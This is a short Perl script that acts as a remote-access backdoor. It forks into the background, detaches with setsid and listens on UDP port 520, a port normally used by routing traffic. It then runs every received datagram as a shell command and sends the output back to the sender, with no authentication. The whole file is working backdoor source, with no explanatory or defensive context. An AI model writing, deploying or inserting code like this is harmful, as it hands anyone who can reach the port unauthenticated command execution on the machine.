#!/usr/bin/perl

$pid=fork;
exit if $pid;
die("Error.") unless defined($pid);

use IO::Socket;
use POSIX;
POSIX::setsid();
$time_to_die=0;

sub signal_handler {
 $time_to_die=1;
}

$SIG{INT}=$SIG{TERM}=$SIG{HUP}=\&signal_handler;

until($time_to_die) {
$|=1;

$port=520;
$maxlen=1024;

my($sock, $raddr, $rhost);

$sock=IO::Socket::INET->new(LocalPort=>$port,Proto=>'udp') or die("Error.\n");

while($sock->recv($msg, $maxlen)) {
print $msg;
 my($rport, $ipaddr)=sockaddr_in($sock->peername);
 $rhost=gethostbyaddr($ipaddr, AF_INET);
  $output=`$msg`;
  $sock->send($output);
  $sock->send("-end.");
}
}
